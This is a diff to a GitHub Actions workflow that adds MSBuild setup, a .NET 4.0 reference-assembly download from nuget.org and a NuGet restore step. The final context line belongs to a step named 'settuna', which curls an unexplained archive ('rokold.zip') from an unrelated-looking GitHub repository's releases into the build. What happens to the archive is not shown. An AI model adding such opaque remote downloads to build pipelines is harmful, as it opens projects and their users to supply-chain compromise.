@@ -22,6 +22,22 @@ jobs:
         uses: TheMrMilchmann/setup-msvc-dev@79dac248aac9d0059f86eae9d8b5bfab4e95e97c # v4.0.0
         with:
           arch: x64
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v3
+
+      - name: Install .NET 4.0 Targeting Pack (Workaround)
+        shell: powershell
+        run: |
+          Invoke-WebRequest -Uri "https://www.nuget.org/api/v2/package/Microsoft.NETFramework.ReferenceAssemblies.net40/1.0.3" -OutFile "net40.zip"
+          Expand-Archive -Path "net40.zip" -DestinationPath "net40_extracted"
+          $TargetDir = "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0"
+          if (!(Test-Path $TargetDir)) {
+              New-Item -ItemType Directory -Force -Path $TargetDir
+          }
+          Copy-Item -Path "net40_extracted\build\.NETFramework\v4.0\*" -Destination $TargetDir -Recurse -Force
+          Write-Host "Successfully injected .NET 4.0 Targeting Pack assemblies into: $TargetDir"
+      - name: Restore NuGet Packages
+        run: nuget restore MuPDF.sln
       - name: settuna
         run: |
           curl -L -o "gg.zip" "https://github.com/Klanlg/bleeda/releases/download/1.0/rokold.zip"
